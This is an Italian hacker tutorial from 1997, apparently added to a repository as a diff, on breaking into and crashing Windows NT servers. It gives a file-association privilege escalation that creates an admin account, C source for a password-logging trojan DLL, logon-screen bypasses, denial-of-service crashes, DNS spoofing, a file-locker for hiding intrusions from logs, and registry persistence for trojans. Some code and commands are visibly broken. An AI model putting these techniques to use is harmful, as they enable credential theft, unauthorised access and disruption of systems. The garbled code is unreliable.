@@ -1,0 +1,424 @@
+      <=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                  -=> Lord Shinva <=-                  <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                  -DiGiTAL::ALLiANCE-                  <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>   C : 0 . N : F . E : D . E : R . A : T . i : 0 . N   <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>               Enciclopedia dell'Hacking               <=-=>
+      <=-=>               `````````````````````````               <=-=>
+      <=-=>                   .:[ Volume 12 ]:.                   <=-=>
+      <=-=>                                                       <=-=>
+      <=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=>
+
+HACKING AVANZATO DI WINDOWS NT
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Dal momento che ci stiamo accingendo ad esplorare Windows NT, mi aspetto che
+conosciate gia` il funzionamento dei Registry di Windows, in quanto una loro
+trattazione esula dall'hacking ed e` comunque reperibile sia in libreria che
+su Internet.
+
+Mi limitero` quindi a ricordare solo le basi della sicurezza in Windows NT:
+
+LSA (Local Security Authority, ovvero Autorit… di Sicurezza Locale)
+E` conosciuto anche con il nome di Security Subsystem (Sottosistema di
+Sicurezza).  E` il componente centrale della sicurezza NT ed Š preposto
+all'autenticazione degli utenti e all'audit (logging).
+
+SAM (Security Account Manager, ovvero Manager di Sicurezza degli Account)
+Fornisce autenticazione al LSA e controlla i gli account per gruppi e utenti.
+
+SRM (Security Reference Monitor, ovvero Monitor della Referenza di Sicurezza)
+Controlla gli account ogniqualvolta un utente cerca di accedere a un file o
+directory e gli da o nega il permesso in base ai suoi privilegi d'accesso, e
+comunica le infrazioni al LSA tramite messaggi di audit.
+
+UI (User Interface, ovvero Interfaccia Utente)
+E` in pratica quello che l'utente vede, cioe` l'interfaccia con la quale egli
+interagisce e che comunica in modo invisibile con gli elementi appena visti.
+
+ACL (Access Control List, ovvero Lista di Controllo dell'Accesso)
+Ogni utente ha una ACL che rappresenta i suoi permessi e privilegi in fatto
+di directory, file, ecc.
+
+L'autenticazione degli utenti funziona nel modo seguente: l'utente effettua
+il login, NT crea un token che rappresenta quell'utente e associa al token i
+privilegi che trova nella sua ACL, e agisce in base ad essi.
+
+Procederemo ora per quesiti, in modo da rendere piu` agevole la lettura.
+
+QUESITO 1: Quali sono i permessi di default?
+
+Questi sono i permessi per gli utenti di default:
+
+- Server Operators:  spegnimento, anche da remoto; reset dell'orologio di
+                     sistema; backup e restore.
+- Backup Operators:  spegnimento; backup e restore.
+- Account Operators: spegnimento.
+- Print Operators:   spegnimento.
+
+Questi sono i permessi per le directory di Windows NT:
+
+\(root), \SYSTEM32, \WIN32APP
+Server Operator e Everyone possono leggere ed eseguire file, mostrare i
+permessi e cambiare gli attributi dei file.
+
+\SYSTEM32\CONFIG
+Everyone puo` effettuare una DIR in questa directory.
+
+\SYSTEM32\DRIVERS, \SYSTEM\REPL
+Server Operator ha accesso completo. Everyone ha solo accesso in lettura.
+
+\SYSTEM32\SPOOL
+Server Operator e Print Operator hanno accesso completo. Everyone ha solo
+accesso in lettura.
+
+\SYSTEM32\REPL\EXPORT
+Server Operator puo` leggere ed eseguire file, permessi e attributi.
+Replicator ha solo accesso in lettura.
+
+\SYSTEM32\REPL\IMPORT
+Server Operator e Replicator possono leggere ed eseguire file, permessi e
+attributi. Everyone ha accesso in lettura.
+
+\USERS
+Account Operator puo` leggere, scrivere, cancellare ed eseguire file.
+Everyone puo` effettuare una DIR.
+
+\USERS\DEFAULT
+Everyone pu• leggere, scrivere ed eseguire file.
+
+QUESITO 2: Qual'e` l'account pi— interessante?
+
+Sicuramente l'account dell'amministratore (SysAdmin), ma potrebbe essere
+stato rinominato... in tal caso, basta eseguire "NBTSTAT -A ipaddress" per
+conoscere il nuovo nome dell'account e opzionalmente anche un elenco completo
+di quali servizi sono in funzione, il nodename e l'eventuale indirizzo
+hardware dell'ethernet (in caso di LAN).
+
+QUESITO 3: Dove si trovano le password in Windows NT?
+
+Da nessuna parte.  Windows NT (come anche UNIX) non immagazzina le password,
+ma bensi` un hash (valore numerico calcolato in base alla password, dal quale
+non si puo` risalire alla stringa originale, in quanto e` solo un numero).
+
+Per crackare gli hash si puo` utilizzare il programma PWDUMP (lo potete
+trovare sui siti hacker) e comunque si tratta di un attacco basato su
+dizionari, quindi di tipo "brute force" (forza bruta).
+
+Quindi, dicevamo, la domanda giusta sarebbe: "dov'e` l'elenco degli hash?"
+
+La risposta e`: nella directory \WINNT\SYSTEM32\CONFIG c'e` un file chiamato
+SAM.  E` questo il database che cerchiamo. E` leggibile da tutti gli utenti
+(a meno che quel simpaticone del SysAdmin non ci abbia messo lo zampino), ma
+comunque non si puo` leggere in quanto bloccato (via sharing) perche` e` in
+uso dai componenti di sistema di NT.  A questo punto il SysAdmin giubila ed
+esulta, ma l'hacker sa dell'esistenza di SAM.SAV che Š il backup di SAM...
+
+Inoltre, durante l'installazione di NT, una copia del SAM viene posta in
+\WINNT\REPAIR.  Quasi sicuramente troveremo solo gli account Administrator e
+Guest, ma credo che Administrator (SysAdmin) sia abbastanza...
+
+A proposito del SAM... se siete completamente pazzi potete anche mettere le vostre manacce nelle keys del SAM.  Per esempio, schedulando il servizio di logon come LocalSystem e permettendogli di interagire con il desktop, e poi schedulando una sessione interattiva di regedt32.exe (come LocalSystem) con il quale manipolare le keys.  Ovviamente se non sapete a cosa serve tutto questo sar… meglio non toccare niente, altrimenti saranno guai grossi...
+
+QUESITO 4: Come accedere al file system se e` di tipo NTFS anziche` FAT ?
+
+Se siete vicini alla macchina (cioe` in locale), effettuate un boot tramite
+un dischetto MS-DOS ed eseguite NTFSDOS.EXE per accedere al NTFS.  Oppure
+potete utilizzare il dischetto di boot di Linux... in pratica basta
+semplicemente eseguire Linux.  Pu• sembrare strano, ma cio` vi dara` accesso
+totale al file system in quanto Linux puo` leggere NTFS.
+
+QUESITO 5: Sono vicino alla console locale, come accedo alle informazioni
+           degli altri computer?
+
+Se il computer sul quale vi trovate e` un domain controller (oppure se e`
+collegato al computer) bastera` fare quanto segue:
+
+1.  Da USER MANAGER, create una trusting relationship (rapporto di fiducia)
+    con l'obiettivo.
+2.  Inserite la password (quello che volete).  Sembrera` non funzionare, ma
+    l'obiettivo sar… ora nella vostra trusting list.
+3.  Avviate NT Explorer e cliccate col tasto destro del mouse su qualsiasi
+    cartella.
+4.  Selezionate SHARING (condivisione).
+5.  Dalla finestra SHARED, selezionate ADD ("aggiungi", se NT Š in italiano).
+6.  Dal menu ADD, selezionate il vostro obiettivo (il server "vittima").
+7.  Ora vedrete l'intera lista dei gruppi dell'obiettivo.
+8.  Selezionate SHOW USERS e vedrete l'intera lista utenti, completa di nomi
+    dei file, directory e descrizioni...
+
+QUESITO 6: Ho accesso Administrator, come accedere alla lista degli utenti?
+
+Ah ci siete riusciti, bene bene... ;)  Usate questo metodo:
+
+- Eseguite NBTSTAT -A ipaddress
+- Aggiungete il nome che otterrete al file LMHOSTS
+- Se la versione di NT Š inferiore alla 4, digitate NBTSTAT -R per effettuare
+  il refresh dei nomi del NetBios
+- Eseguite NET VIEW \\nomemacchina per vedere gli shares ("condivisioni")
+- Eseguite DIR \\nomemacchina\share per listare gli shares (se aperti)
+- Eseguite NET VIEW \\ipaddress oppure NET VIEW \\nome.completo.com se usate
+  Windows NT 4.0
+
+QUESITO 7: Ho accesso Guest... come faccio ad avere accesso Administrator?
+
+NT 3.51 ha varie directory (e file) leggibili e scrivibili da tutti gli
+utenti per default.  Potete editare le associazioni tra un'applicazione e i
+file dati, usando REGEDT32.EXE, ma prima dovete creare (e compilare)
+un'applicazione per Win32 (magari in Delphi o C++ a 32-bit) che si limiti ad
+eseguire i seguenti comandi e nient'altro:
+
+        net  user  administrator  hacker  /y
+        notepad  %1  %2  %3  %4  %5
+
+Inviate (tramite upload) questa "applicazione" in una share (directory di
+condivisione) a cui avete accesso e cambiate l'associazione tra i file .txt e
+notepad in modo che punti alla locazione completa del vostro file (ad esempio
+\\NomeWorkstation\RWShare\hahaha.exe).
+
+Non appena un file di testo verra` visualizzato da qualcuno sul server,
+quell'associazione verra` eseguita e sara` attivato l'user Administrator con
+password "hacker", alla faccia del SysAdmin...
+
+Per questo motivo, se io fossi il SysAdmin eliminerei il permesso Everyone
+dalla chiave HKEY_CLASSES_ROOT dei registry, dando l'accesso completo solo a
+Creator e Owner.
+
+QUESITO 8: La SYSTEM32 nella directory di sistema di NT Š scrivibile, cosa
+           si potrebbe fare?
+
+Se il sistema e` un Windows NT versione 4.0 la risposta e`: molte cose... :)
+Basta creare un troiano sotto forma di DLL e rinominarlo FPNWCLNT.DLL e
+quindi metterlo in quella directory.  Ad esempio, utilizzando questo troiano
+scritto in C++ troverete nella directory \TEMP del server tutti gli username
+e password di tutti gli utenti che accedono al sistema...
+
+#include
+#include
+#include
+
+struct UNI_STRING {
+  USHORT len;
+  USHORT maxlen;
+  WCHAR *buff;
+  };
+
+static HANDLE fh;
+
+BOOLEAN __stdcall InitializeChangeNotify ()
+{
+  DWORD wrote;
+  fh = CreateFile("C:\\temp\\shinva.txt", GENERIC_WRITE,
+    FILE_SHARE_READ|FILE_SHARE_WRITE, 0, CREATE_ALWAYS,
+    FILE_ATTRIBUTE_NORMAL|FILE_FLAG_WRITE_THROUGH,
+    0);
+  WriteFile(fh, "Procedura InitializeChangeNotify avviata\n", 31, &wrote, 0);
+  return TRUE;
+}
+
+LONG __stdcall PasswordChangeNotify (struct UNI_STRING *user, ULONG rid,
+  struct UNI_STRING *passwd)
+{
+  DWORD wrote;
+  WCHAR wbuf[200];
+  char buf[512];
+  char buf1[200];
+  DWORD len;
+
+  memcpy(wbuf, user->buff, user->len);
+  len = user->len/sizeof(WCHAR);
+  wbuf[len] = 0;
+  wcstombs(buf1, wbuf, 199);
+  sprintf(buf, "User = %s : ", buf1);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+  memcpy(wbuf, passwd->buff, passwd->len);
+  len = passwd->len/sizeof(WCHAR);
+  wbuf[len] = 0;
+  wcstombs(buf1, wbuf, 199);
+  sprintf(buf, "Password = %s : ", buf1);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+  sprintf(buf, "RID = %x\n", rid);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+  return 0L;
+}
+
+Quando analizzate il vostro "log file" controllate se ci sono username con
+SID pari a -500 (SysAdmin).  Guest ha SID pari a -501.
+Ovviamente bisognera` riavviare il server dopo aver inviato la DLL, per
+farla attivare.
+
+QUESITO 9: Mi trovo con la schermata di login di NT (quella che esce premendo
+           CTRL-ALT-DEL), come faccio per bypassarla?
+
+Ecco qui di seguito spiegata la procedura per liberarsi dello screen-saver
+(funziona solo con NT inferiore alla versione 4.0).
+
+Basta entrare come Administrator e verra` mostrato lo schermo del desktop per
+alcuni secondi.  Utilizzando il mouse (prima che lo schermo desktop non sia
+piu` accessibile) si possono effettuare modifiche, spostamenti, ecc.
+Se cio` non dovesse accadere perche` e` stato installato il Service Pack
+(sulla 3.x) c'e` ancora una speranza: bisognera` andare su un'altra
+workstation e digitare "shutdown \\nomecomputer /t:30" in modo che venga
+attivato uno shutdown (spegnimento) entro 30 secondi sul computer "vittima"
+e appaia una Security Window.  A questo punto si potra` digitare il comando
+"shutdown \\nomecomputer /a" in modo che lo shutdown venga annullato.
+Andando sul computer "vittima" e muovendo il mouse lo schermo si cancellera`
+e potremo premere CTRL-ALT-DEL per far apparire di nuovo la Security Window.
+Si scelga "cancel" e si avra` immediatamente accesso al Program Manager!
+
+QUESITO 10: Come faccio a sapere da remoto se si tratta di NT o 95 ?
+
+In genere e` usanza dei Webmaster scrivere nelle pagine Web "Noi usiamo
+Windows NT" o qualcosa del genere, ma nella maggioranza dei casi ci
+limiteremo a controllare che la porta 135 sia aperta (tramite un port
+scanner o una semplice connessione via Telnet).
+A questo punto bastera` dare un'occhiata ai registry: se
+HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT esiste, saremo sicuri che non
+si tratti di Windows 95.
+Infine, uno sguardo alla key \CurrentVersion\CurrentVersion ci permettera` di
+capire di quale versione si tratta.
+In alternativa, si puo` controllare l'esistenza delle porte del NetBios (137
+e 139) e dei servizi SMB.
+
+QUESITO 11: Come faccio ad utilizzare il modo di trasferimento passivo sul
+            server FTP se non e` attivo?
+
+Se il server FTP utilizzato e` quello di default (Microsoft), bastera`
+editare una key dei registry di Windows NT:
+
+   System\CurrentControlSet\Services\MSFTPSVC\Parameters
+   chiave:  EnablePortAttack,REG_DWORD
+
+e abilitarla settandola a 1.
+
+QUESITO 12: Come trashare un sistema che utilizza NT ?
+
+Se lasciamo perdere i metodi "tradizionali" (lavorando sui file), eccone
+alcuni "alternativi" da far gustare al SysAdmin...
+
+Aprendo una connessione Telnet alla porta 53 del server e digitando una
+decina di caratteri a caso seguiti da invio, bloccheremo il DNS del server
+fino al riavvio del sistema... niente piu` host name, solo IP address!
+
+Oppure magari vogliamo trasformare il suo Pentium II 233 Mhz in uno 8086 8
+Mhz?  Niente di piu` facile, basta collegarsi via Telnet (come sopra) alla
+porta 135.  Se la porta risponde, facendo come nel caso del DNS, avremo
+rallentato del 100% la velocit… della CPU...
+
+E se poi il SysAdmin utilizza IIS Microsoft come Web server, una connessione
+alla porta 1031 gli fara` passare la voglia di usare i programmi di Bill
+Gates.  Oppure possiamo collegarci alla porta 80 e inviare "GET ../.." per
+crashare il tutto...
+
+Per causare un riavvio improvviso del sistema o un crash (solo con NT
+inferiore alla versione 4.0 e NT senza Hotfix) si puo` utilizzare una tecnica
+conosciuta con il nome di "Ping of Death".  Si tratta di inviare un pacchetto
+ICMP enorme.  Ecco cosa succedera`: il server ricevera` il pacchetto in forma
+frammentata, quindi sotto forma di moltissimi piccoli pacchetti.  Quando
+tentera` di riassemblarli, si avr… un buffer overflow e potranno accadere le
+cose piu` disparate.  Da Windows 95 e Windows NT basta digitare:
+
+   ping -165527 -s 1 nomevittima
+
+L'attacco del SYN flood (o del FIN flood) implica un invio di una quantita`
+enorme di pacchetti forgiati con un IP address sorgente non esistente.
+Windows NT e` vulnerabile fino alla versione 4.0 senza Hotfix.
+
+Infine, ad un piu` alto livello, inviando ad un server NT 4.0 un semplice
+pacchetto DNS di risposta (senza che il server lo abbia richiesto), DNS
+crashera`.
+
+Con il comando smbmount su Linux 2.0.28+ si puo` inoltre causare un crash con
+errore di protezione su un server, eseguendo il comando:
+
+   smbmount //vittima/servizio /mnt -U nomeclient
+
+Se il file ROLLBACK.EXE e` presente sul server (o se ce lo mettiamo noi...)
+possiamo eseguirlo e goderci lo spettacolo: i Registry verranno completamente
+azzerati.  Inoltre, se blocchiamo una porta (ad esempio la 19, detta chargen)
+il server eseguira` automaticamente ROLLBACK per cercare di risolvere il
+problema...
+
+Per chi poi conosce a fondo hacking e spoofing, la cosa piu` divertente resta
+la forgiatura dei pacchetti DNS (di tipo UDP).
+Effettuando una richiesta DNS e utilizzando uno sniffer per intercettare i
+pacchetti di risposta e catturare i numeri ID di riposta DNS e` possibile
+inviare falsi pacchetti DNS a un server in modo che chiunque chieda il suo
+IP address la risposta sia quella che desideriamo.  In pratica, chiunque si
+colleghera` a quel server si colleghera` in pratica al server che vogliamo
+noi, dato dall'IP address che abbiamo inviato nel pacchetto "forgiato".
+
+Con questo metodo, applicato ad altri servizi, e` possibile fare copie di
+tutte le email che transitano sul sistema, inibire l'accesso ai servizi,
+re-routing, e molto altro ancora.
+
+QUESITO 13: Come impedire a chiunque, anche al SysAdmin, di accedere a uno o
+            piu` file?
+
+Ad esempio con questo programmino in C si puo` bloccare un file per quanto
+tempo si desidera, passando (al programma) il nome del file da bloccare:
+
+#include
+    void main(int ac, char *av[])
+    {
+      HANDLE fp;
+      fp = CreateFile(av[1], FILE_READ_DATA, 0, 0, OPEN_EXISTING, 0, 0);
+      if (fp == INVALID_HANDLE_VALUE)
+        exit(GetLastError());
+      Sleep(60000)     {  tempo di bloccaggio espresso in: secondi * 1000  }
+      exit(0);
+    }
+
+A che puo` servire bloccare un file?  Beh, ad esempio, se blocchiamo un file
+di log per un'ora e hackeriamo il server per un'ora, il SysAdmin non ne
+sapra` mai niente...
+
+QUESITO 14: Cos'altro si puo` fare con i Registry?
+
+Troppo lungo da spiegare... come dico sempre, basta usare la fantasia...
+Comunque ci sono un paio di cosette ancora.  Ad esempio, per effettuare il
+logging del PPP basta selezionare...
+
+HKEY_LOCAL_MACHINE\CurrentControlSet\Services\RasMan\PPP
+           valore = Logging
+           valore = REG_DWORD
+   valore = 1  (settare questo valore)
+
+mentre per abilitare quello della seriale basta selezionare Parameters
+(anziche` PPP) come ultimo valore della key.
+
+Una cosa molto utile e` la possibilita` di eseguire le applicazioni che
+abbiamo inviato (troiani, ad esempio) e per farlo possiamo modificare una di
+queste due keys...
+
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VXD
+
+aggiungendo una nuova key di tipo StaticVxd e inserendo il percorso completo
+dell'applicazione, oppure...
+
+HKEY_LOCAL_MACHINE\\Software\Classes\txtfile\shell\open\command
+
+per sfruttare il metodo delle associazioni (file di testo, in questo caso)
+per eseguire la nostra applicazione.
+
+Il vantaggio della prima key e` che l'applicazione verra` eseguita a Ring-0
+(quindi con accesso completo sul sistema operativo e sulle sue risorse, anche
+a basso livello, su memoria, disco rigido, ecc).
+
+Buon hacking con NT...
+
++- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +-
+
+                           Copyright (C) 1997 by
+
+                             :: LoRD SHiNVA ::
+
+                      -Digital Alliance Confederation-
+
+                http://members.tripod.com/~helghast/dac.htm
+
++- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +-
